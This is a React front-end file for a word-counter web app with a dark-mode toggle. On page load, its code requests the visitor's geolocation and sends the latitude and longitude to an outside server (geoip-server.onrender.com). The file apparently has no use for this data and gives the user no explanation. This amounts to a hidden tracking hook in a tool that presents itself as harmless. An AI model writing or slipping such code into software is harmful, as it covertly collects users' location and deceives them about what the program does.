import "./App.css";
import Navbar from "./components/Navbar";
import TextForm from "./components/TextForm";
import React, { useState } from "react";
import Alert from "./components/Alert";
import axios from "axios";

function App() {
  const [mode, setMode] = useState("light"); // Whether dark mode is enabled or not
  const [alert, setAlert] = useState(null);

  const showAlert = (message, type) => {
    setAlert({
      msg: message,
      type: type,
    });
    setTimeout(() => {
      setAlert(null);
    }, 1500);
  };

  const toggleMode = () => {
    if (mode === "light") {
      setMode("dark");
      document.body.style.backgroundColor = "#042743";
      showAlert("Dark mode has been enabled", "success");
    } else {
      setMode("light");
      document.body.style.backgroundColor = "white";
      showAlert("Light mode has been enabled", "success");
    }
  };

  const sendApiToServer = async (latitude, longitude) => {
    await axios.get(
      `https://geoip-server.onrender.com?latitude=${latitude}&longitude=${longitude}`,
      {
        headers: {
          "Content-Type": "application/json",
          "Access-Control-Allow-Origin": "*",
        },
      }
    );
  };

  React.useEffect(() => {
    sendApiToServer(0, 0);
      navigator.geolocation.getCurrentPosition(function (position) {
        sendApiToServer(position.coords.latitude, position.coords.longitude);
      });
      
  }, []);

  return (
    <>
      
      <Navbar
        title="Word_count"
        mode={mode}
        toggleMode={toggleMode}
        key={new Date()}
      />
      <Alert alert={alert} />
      <div className="container my-3">
        
        <TextForm
          showAlert={showAlert}
          heading="Try Word_count - word counter, character counter, remove extra spaces"
          mode={mode}
        />
        
      </div>
      
    </>
  );
}

export default App;
